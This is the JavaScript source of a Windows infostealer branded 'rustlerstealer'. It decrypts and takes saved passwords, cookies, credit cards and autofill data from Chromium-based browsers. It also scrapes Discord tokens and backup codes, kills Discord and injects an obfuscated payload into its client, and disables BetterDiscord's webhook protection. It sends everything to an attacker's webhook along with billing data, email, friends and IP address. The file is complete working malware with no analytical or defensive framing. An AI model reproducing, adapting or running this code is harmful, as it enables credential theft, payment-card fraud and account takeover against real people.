const fs = require('fs');
const axios = require('axios').default;
const glob = require('glob');
const buf_replace = require('buffer-replace');
const { exec } = require('child_process');
const FormData = require('form-data');
const crypto = require('crypto');
const sqlite3 = require('sqlite3');
const dpapi = require('win-dpapi');
const JavaScriptObfuscator = require('javascript-obfuscator');

const key = '%key%'
const wbk = 'da_webhook';

var appdata = process.env.APPDATA,
    LOCAL = process.env.LOCALAPPDATA,
    gameFiles = [],
    runningDiscords = [],
    paths = [
        appdata + '\\discord\\',
        appdata + '\\discordcanary\\',
        appdata + '\\discordptb\\',
        appdata + '\\discorddevelopment\\',
        appdata + '\\lightcord\\',
        LOCAL + '\\Google\\Chrome\\User Data\\Default\\',
        LOCAL + '\\Google\\Chrome\\User Data\\Profile 1\\',
        LOCAL + '\\Google\\Chrome\\User Data\\Profile 2\\',
        LOCAL + '\\Google\\Chrome\\User Data\\Profile 3\\',
        LOCAL + '\\Google\\Chrome\\User Data\\Profile 4\\',
        LOCAL + '\\Google\\Chrome\\User Data\\Profile 5\\',
        LOCAL + '\\Google\\Chrome\\User Data\\Guest Profile\\',
        LOCAL + '\\Google\\Chrome\\User Data\\Default\\Network\\',
        LOCAL + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
        LOCAL + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
        LOCAL + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
        LOCAL + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
        LOCAL + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
        LOCAL + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
        appdata + '\\Opera Software\\Opera Stable\\',
        appdata + '\\Opera Software\\Opera GX Stable\\',
        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
        LOCAL + '\\Microsoft\\Edge\\User Data\\Default\\',
        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
        LOCAL + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
        LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
        LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
        LOCAL + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
        LOCAL + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
        LOCAL + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
    ];

((async () => {
    await takeCreditcards();
    await takeCheese();
    await takePizzas();
    await takeAutofilldata();
    await getPeperonni();
    await stealTokens();
})());

fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("cord")) {
        let pattern = LOCAL + '\\' + file + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js";
        glob.sync(pattern).map(fi => {
            gameFiles.push(fi);
            listDiscord();
        });
    } else {
        return;
    };
});

function listDiscord() {
    exec('tasklist', function (err, stdout, stderr) {
        if (stdout.includes('Discord.exe')) runningDiscords.push('Discord');
        if (stdout.includes('DiscordCanary.exe')) runningDiscords.push('DiscordCanary');
        if (stdout.includes('DiscordPTB.exe')) runningDiscords.push('DiscordPTB');
        if (stdout.includes('DiscordDevelopment.exe')) runningDiscords.push('DiscordDevelopment');
        killDiscord();
    });
};

function killDiscord() {
    runningDiscords.forEach(disc => {
        try {
            exec('taskkill /IM ' + disc + '.exe /F'), (err) => {
                if (err) { };
            };
        } catch (e) { };
    });
    Infect();
    pwnBetterDiscord();
};

function startDiscord() {
    runningDiscords.forEach(disc => {
        try {
            exec(LOCAL + '\\' + disc + '\\Update.exe' + ' --processStart ' + disc + '.exe', err => {
                if (err) { };
            });
        } catch (e) { };
    });
};

async function Infect() { 
    let resp = await axios.get('http://localhost:80/api/injector');
    const obfuscationResult = JavaScriptObfuscator.obfuscate(resp.data.replace('%key%', key), { "ignoreRequireImports": true, "compact": true, "controlFlowFlattening": true, "controlFlowFlatteningThreshold": 0.5, "deadCodeInjection": false, "deadCodeInjectionThreshold": 0.01, "debugProtection": false, "debugProtectionInterval": 0, "disableConsoleOutput": true, "identifierNamesGenerator": "hexadecimal", "log": false, "numbersToExpressions": false, "renameGlobals": false, "selfDefending": false, "simplify": true, "splitStrings": false, "splitStringsChunkLength": 5, "stringArray": true, "stringArrayEncoding": ["base64"], "stringArrayIndexShift": true, "stringArrayRotate": false, "stringArrayShuffle": false, "stringArrayWrappersCount": 5, "stringArrayWrappersChainedCalls": true, "stringArrayWrappersParametersMaxCount": 5, "stringArrayWrappersType": "function", "stringArrayThreshold": 1, "transformObjectKeys": false, "unicodeEscapeSequence": false });
    const payload = obfuscationResult.getObfuscatedCode();
    gameFiles.forEach(file => {
        try {
            fs.writeFileSync(file, payload, {
                encoding: 'utf8',
                flag: 'w'
            });
        } catch (e) { };
        startDiscord()
    });
};

function pwnBetterDiscord() {
    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        var x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "ezbysudry"))
    } else {
        return;
    }
}

async function getPeperonni() {
    let str = '';
    const homeDir = require('os').homedir();
    if (fs.existsSync(`${homeDir}\\Downloads`)) {
        fs.readdirSync(`${homeDir}\\Downloads`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                let path = `${homeDir}\\Downloads\\${file}`
                str += `\n\n@~$~@rustler-${path}`,
                    str += `\n\n${fs.readFileSync(path).toString()}`
            }
        })
    }
    if (fs.existsSync(`${homeDir}\\Desktop`)) {
        fs.readdirSync(`${homeDir}\\Desktop`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                let path = `${homeDir}\\Desktop\\${file}`
                str += `\n\n@~$~@rustler-${path}`,
                    str += `\n\n${fs.readFileSync(path).toString()}`
            }
        })
    }
    if (fs.existsSync(`${homeDir}\\Documents`)) {
        fs.readdirSync(`${homeDir}\\Documents`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                let path = `${homeDir}\\Documents\\${file}`
                str += `\n\n@~$~@rustler-${path}`,
                    str += `\n\n${fs.readFileSync(path).toString()}`
            }
        })
    }
    if (str !== '') {
        fs.writeFileSync(appdata + '\\backupcodes.txt', str.slice(2))

        const form = new FormData();
        form.append("file", fs.createReadStream(appdata + "\\backupcodes.txt"));
        form.submit(wbk);
    }
}

async function getCreditcards(path) {
    let path_split = path.split('\\'),
        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join('\\') + '\\';
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
            .os_crypt.encrypted_key, 'base64')
            .slice(5);
        var login_data = path + 'Web Data',
            creditcards_db = path + 'creditcards.db';
        fs.copyFileSync(login_data, creditcards_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = `\n\n@~$~@rustler-${path}`,
            sql = new sqlite3.Database(creditcards_db, err => {
                if (err) { }
            });
        const cb = await new Promise((resolve, reject) => {
            sql.each('SELECT * FROM credit_cards', function (err, row) {
                if (err) { }
                if (row['card_number_encrypted'] != '') {
                    let card_number = row['card_number_encrypted'];
                    try {
                        if ((card_number[0] == 1) && (card_number[1] == 0) && (card_number[2] == 0) && (card_number[3] == 0)) {
                            result += '\nCREDIT CARD NUMBER: ' + dpapi.unprotectData(card_number, null, 'CurrentUser').toString('utf-8') + ' | EXPIRE: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'];
                        } else {
                            let start = card_number.slice(3, 15),
                                middle = card_number.slice(15, card_number.length - 16),
                                end = card_number.slice(card_number.length - 16, card_number.length),
                                decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                            decipher.setAuthTag(end);
                            result += '\nCREDIT CARD NUMBER: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8') + ' | EXPIRE: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'];
                        }
                    } catch (e) { }
                }
            }, function () {
                resolve(result);
            });
        });
        return cb;
    } else {
        return '';
    }
}

async function getAutofilldata(path) {
    let path_split = path.split('\\'),
        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join('\\') + '\\';
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
            .os_crypt.encrypted_key, 'base64')
            .slice(5);
        var login_data = path + 'Web Data',
            autofilldata_db = path + 'autofilldata.db';
        fs.copyFileSync(login_data, autofilldata_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = `\n\n@~$~@rustler-${path}`,
            sql = new sqlite3.Database(autofilldata_db, err => {
                if (err) { }
            });
        const autofill = await new Promise((resolve, reject) => {
            sql.each('SELECT * FROM autofill', function (err, row) {
                if (err) { }
                result += '\nNAME: ' + row['name'] + ' | DATA: ' + row['value'];
            }, function () {
                resolve(result);
            });
        });
        return autofill;
    } else {
        return '';
    }
}

async function getPizzas(path) {
    let path_split = path.split('\\'),
        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join('\\') + '\\';
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
            .os_crypt.encrypted_key, 'base64')
            .slice(5);
        var login_data = path + 'Login Data',
            passwords_db = path + 'passwords.db';
        fs.copyFileSync(login_data, passwords_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = `\n\n@~$~@rustler-${path}`,
            sql = new sqlite3.Database(passwords_db, err => {
                if (err) { }
            });
        const pizza = await new Promise((resolve, reject) => {
            sql.each('SELECT origin_url, username_value, password_value FROM logins', function (err, row) {
                if (row['username_value'] != '') {
                    let password_value = row['password_value'];
                    try {
                        if ((password_value[0] == 1) && (password_value[1] == 0) && (password_value[2] == 0) && (password_value[3] == 0)) {
                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + dpapi.unprotectData(password_value, null, 'CurrentUser')
                                .toString('utf-8');
                        } else {
                            let start = password_value.slice(3, 15),
                                middle = password_value.slice(15, password_value.length - 16),
                                end = password_value.slice(password_value.length - 16, password_value.length),
                                decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                            decipher.setAuthTag(end);
                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
                        }
                    } catch (e) { }
                }
            }, function () {
                resolve(result);
            });
        });
        return pizza;
    } else {
        return '';
    }
}

async function getCheese(path) {
    let path_split = path.split('\\'),
        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join('\\') + '\\';
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
            .os_crypt.encrypted_key, 'base64')
            .slice(5);
        var cookies = path + 'Cookies',
            cookies_db = path + 'cookies.db';
        fs.copyFileSync(cookies, cookies_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = '',
            sql = new sqlite3.Database(cookies_db, err => {
                if (err) { }
            });
        const cheese = await new Promise((resolve, reject) => {
            sql.each('SELECT host_key, name, encrypted_value FROM cookies', function (err, row) {
                let encrypted_value = row['encrypted_value'];
                try {
                    if ((encrypted_value[0] == 1) && (encrypted_value[1] == 0) && (encrypted_value[2] == 0) && (encrypted_value[3] == 0)) {
                        result += row['host_key'] + "	" + "TRUE" + "	/" + "	FALSE" + "	2597573456	" + row['name'] + "	" + dpapi.unprotectData(encrypted_value, null, 'CurrentUser') + "\n"
                            .toString('utf-8');
                    } else {
                        let start = encrypted_value.slice(3, 15),
                            middle = encrypted_value.slice(15, encrypted_value.length - 16),
                            end = encrypted_value.slice(encrypted_value.length - 16, encrypted_value.length),
                            decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                        decipher.setAuthTag(end);
                        result += row['host_key'] + "	" + "TRUE" + "	/" + "	FALSE" + "	2597573456	" + row['name'] + "	" + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8') + "\n"
                    }
                } catch (e) { }
            }, function () {
                resolve(result);
            })
        });
        return cheese;
    } else return '';
}

async function takeCreditcards() {
    let creditcards = '';
    for (let i = 0; i < paths.length; i++) {
        if (fs.existsSync(paths[i] + 'Web Data'))
            creditcards += await getCreditcards(paths[i]) || '';
    }
    if (!creditcards.includes('NUMBER:')) creditcards = 'Creditcards don\'t found.'
    else creditcards = creditcards.slice(2)

    fs.writeFileSync(appdata + '\\creditcards.txt', creditcards)

    const form = new FormData();
    form.append("file", fs.createReadStream(appdata + "\\creditcards.txt"));
    form.submit(wbk);
}

async function takeAutofilldata() {
    let autofilldata = '';
    for (let i = 0; i < paths.length; i++) {
        if (fs.existsSync(paths[i] + 'Web Data'))
            autofilldata += await getAutofilldata(paths[i]) || '';

    }
    if (autofilldata.includes('NAME:')) autofilldata = 'Autofilldata don\'t found.'
    else autofilldata = autofilldata.slice(2)

    fs.writeFileSync(appdata + '\\autofilldata.txt', autofilldata)

    const form = new FormData();
    form.append("file", fs.createReadStream(appdata + "\\autofilldata.txt"));
    form.submit(wbk);
}

async function takePizzas() {
    let passwords = '';
    for (let i = 0; i < paths.length; i++) {
        if (fs.existsSync(paths[i] + 'Login Data'))
            passwords += await getPizzas(paths[i]) || '';
    }
    if (passwords.includes('PASSWORD:')) passwords = 'Passwords don\'t found.'
    else passwords = passwords.slice(2)

    fs.writeFileSync(appdata + '\\passwords.txt', passwords)

    const form = new FormData();
    form.append("file", fs.createReadStream(appdata + "\\passwords.txt"));
    form.submit(wbk);
}

async function takeCheese() {
    let cookies = '';
    for (let i = 0; i < paths.length; i++) {
        if (fs.existsSync(paths[i] + 'Cookies'))
            cookies += await getCheese(paths[i]) || '';
    }
    if (!cookies.includes('2597573456')) cookies = 'Cookies don\'t found.'

    fs.writeFileSync(appdata + '\\cookies.txt', cookies)

    const form = new FormData();
    form.append("file", fs.createReadStream(appdata + "\\cookies.txt"));
    form.submit(wbk);
}

const tokens = [];

async function findToken(path) {
    let path_tail = path;
    path += 'Local Storage\\leveldb';

    if (!path_tail.includes('discord')) {
        try {
            fs.readdirSync(path)
                .map(file => {
                    (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                        .split(/\r?\n/)
                        .forEach(line => {
                            const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];
                            for (const pattern of patterns) {
                                const foundTokens = line.match(pattern);
                                if (foundTokens) foundTokens.forEach(token => {
                                    if (!tokens.includes(token)) tokens.push(token)
                                });
                            }
                        });
                });
        } catch (e) { }
        return;
    } else {
        if (fs.existsSync(path_tail + '\\Local State')) {
            try {
                fs.readdirSync(path)
                    .map(file => {
                        (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                            .split(/\r?\n/)
                            .forEach(line => {
                                const pattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g);
                                const foundTokens = line.match(pattern);
                                if (foundTokens) {
                                    foundTokens.forEach(token => {
                                        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
                                            .os_crypt.encrypted_key, 'base64')
                                            .slice(5);
                                        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
                                        token = Buffer.from(token.split('dQw4w9WgXcQ:')[1], 'base64')
                                        let start = token.slice(3, 15),
                                            middle = token.slice(15, token.length - 16),
                                            end = token.slice(token.length - 16, token.length),
                                            decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                                        decipher.setAuthTag(end);
                                        let out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
                                        if (!tokens.includes(out)) tokens.push(out)
                                    })
                                };
                            });
                    });
            } catch (e) { }
            return;
        }
    }
}

async function stealTokens() {
    for (let path of paths) {
        await findToken(path);
    }
    for (let token of tokens) {
        let json;
        await axios.get("https://discord.com/api/v9/users/@me", {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        }).then(res => { json = res.data }).catch(() => { json = null })
        if (!json) continue;
        var ip = await getIp();
        var billing = await getBilling(token);
        var friends = await getRelationships(token);
        axios.post(wbk, {
            content: "",
            embeds: [{
                "fields": [
                    {
                        name: `<a:rustler:987689940852817971> Token:`,
                        value: `\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
                        inline: false
                    },
                    {
                        name: `<:rustler:987689933844127804> Badges:`,
                        value: getBadges(json.flags),
                        inline: true
                    },
                    {
                        name: `<:rustler:987689935018549328> Nitro Type:`,
                        value: await getNitro(json.premium_type, json.id, token),
                        inline: true
                    },
                    {
                        name: `<a:rustler:987689939401588827> Billing:`,
                        value: billing,
                        inline: true
                    },
                    {
                        name: `<:rustler:987689943558135818> Email:`,
                        value: `\`${json.email}\``,
                        inline: true
                    },
                    {
                        name: `<:rustler:987689942350196756> IP:`,
                        value: `\`${ip}\``,
                        inline: true
                    }
                ],
                "color": 3553599,
                "author": {
                    "name": `${json.username}#${json.discriminator} (${json.id})`,
                    "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
                },
                "footer": {
                    "text": "@rustlerstealer"
                },
                "thumbnail": {
                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
                }
            }, {
                "color": 3553599,
                "description": friends,
                "author": {
                    "name": "HQ Friends",
                    "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
                },
                "footer": {
                    "text": "@rustlerstealer"
                },
            }]
        }).then(res => { }).catch(() => { })
        continue;
    }
}

const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "<:moderator:976739399998001152>",
        Rare: true,
    }
};

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).catch(() => { })
    if (!j) return `*Account locked*`
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*Nothing to see here*"
    return gay
}

async function getBilling(token) {
    let json;
    await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return '\`Unknown\`';

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:946246524504002610:962747802830655498>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += "<:rustler:987692721613459517>";
        }
    });
    if (bi == '') bi = `\`No Billing\``
    return bi;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') return `\`No Badges\``;
    return `${b}`;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:946246402105819216:962747802797113365>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:946246402105819216:962747802797113365>";

            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

            let boost = ["<:boost1month:967519402293624862>", "<:boost2month:967519562868338728>", "<:boost3month:969685462157525044>", "<:boost6month:969686607961665628>", "<:boost9month:967520103367340092>", "<:boost12month:969687191133499403>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:946246402105819216:962747802797113365> ${boost[i]}`
        default:
            return "\`No Nitro\`";
    };
}

async function getIp() {
    var ip = await axios.get("https://www.myexternalip.com/raw")
    return ip.data;
}

process
    .on("uncaughtException", err => console.error(err))
    .on("unhandledRejection", err => console.error(err));
